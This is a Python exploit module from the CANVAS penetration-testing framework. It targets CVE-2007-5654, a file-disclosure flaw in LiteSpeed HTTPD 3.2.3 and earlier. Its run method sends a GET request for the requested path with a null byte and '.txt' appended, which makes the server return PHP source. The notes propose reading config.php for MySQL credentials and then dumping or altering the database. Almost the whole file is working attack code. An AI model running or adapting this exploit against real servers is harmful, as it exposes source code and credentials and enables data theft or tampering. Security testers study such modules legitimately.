#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

NAME="Litespeed HTTPD file disclosure"
DESCRIPTION="Litespeed HTTPD file disclosure"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="LiteSpeed Technologies"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2007-5654"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5654"
DOCUMENTATION['CVSS'] = 5.0

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ], ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""
LiteSpeed HTTPD 3.2.3 and prior
http://www.securityfocus.com/bid/26163/discuss

LiteSpeed Web Server is prone to an information-disclosure vulnerability because it fails to adequately sanitize user-supplied input.

Attackers can exploit this issue to access potentially sensitive information that could aid in further attacks.

example: config.php to read, login with mysql info, mysqldump or insert new data.
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.user=""
        self.password=""
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.getarg("basepath")
        self.getarg("command")
        self.ssl=self.argsDict.get("ssl",self.ssl)
        self.getarg("user")
        self.getarg("port")
        self.getarg("password")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("hostname")
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts

        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]
            
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"
	#port=self.port
        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None
            
        #UA=spkproxy.UserAgent(protocol+"://"+self.host+":8088/"+self.basepath, auth=auth, hostname=self.hostname, exploit=self)
        
	UA=spkproxy.UserAgent(protocol+"://"+self.host+":%s"%self.port+"/"+self.basepath, auth=auth, hostname=self.hostname, exploit=self)
                                           
        data = UA.GET("%s%s%%00.txt"%(self.basepath, self.command))
	self.log("Source=%s"%data)
        #ret=self.ISucceeded()
        #    
        #if ret:
        #    self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        #else:
        #    self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        #return ret
	self.log("Check CANVAS log in next tab for page source")        
	
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
